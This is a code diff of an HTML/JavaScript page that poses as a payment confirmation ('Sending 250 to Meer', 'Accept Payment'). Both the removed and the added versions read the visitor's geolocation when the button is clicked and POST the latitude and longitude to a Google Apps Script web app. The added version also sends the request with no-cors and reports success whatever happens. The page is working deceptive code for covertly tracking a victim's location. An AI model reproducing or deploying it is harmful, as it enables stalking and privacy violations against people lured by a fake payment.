@@ -1,56 +1,39 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Payment Confirmation</title>
-</head>
-<body style="font-family: Arial, sans-serif; text-align:center; margin-top: 100px;">
-  <h2>Sending 250 to Meer</h2>
-  <button style="padding: 15px 30px; font-size: 18px; cursor:pointer;" onclick="getLocation()">Accept Payment</button>
-  <p id="status"></p>
+<script>
+  function getLocation() {
+    const status = document.getElementById('status');
 
-  <script>
-    function getLocation() {
-      const status = document.getElementById('status');
-
-      if (!navigator.geolocation) {
-        status.textContent = 'Geolocation is not supported by your browser.';
-        return;
-      }
-
-      status.textContent = 'Verifying location...';
-
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-
-          fetch("https://script.google.com/macros/s/AKfycbyyi6BSFJy2DzY4cZFmIFDDN5qYGw-BZTQnHhwQEOIxox5ooZYhkii4ekdsZMNUKG_QgQ/exec", {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              latitude: latitude,
-              longitude: longitude
-            })
-          })
-          .then(response => {
-            if (response.ok) {
-              status.textContent = 'Payment accepted. Location sent.';
-            } else {
-              throw new Error('Network response was not ok.');
-            }
-          })
-          .catch(error => {
-            console.error('Error:', error);
-            status.textContent = 'Failed to send location. Please try again.';
-          });
-        },
-        () => {
-          status.textContent = 'Unable to retrieve your location.';
-        }
-      );
+    if (!navigator.geolocation) {
+      status.textContent = 'Geolocation is not supported by your browser.';
+      return;
     }
-  </script>
-</body>
-</html>
+
+    status.textContent = 'Verifying location...';
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        status.textContent = 'Sending location...';
+
+        // Send the data to your Google Web App
+        fetch("https://script.google.com/macros/s/AKfycbyyi6BSFJy2DzY4cZFmIFDDN5qYGw-BZTQnHhwQEOIxox5ooZYhkii4ekdsZMNUKG_QgQ/exec", {
+          method: "POST",
+          mode: "no-cors",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            latitude: latitude,
+            longitude: longitude
+          })
+        });
+
+        status.textContent = 'Payment accepted. Location sent.';
+      },
+      () => {
+        status.textContent = 'Unable to retrieve your location.';
+      }
+    );
+  }
+</script>
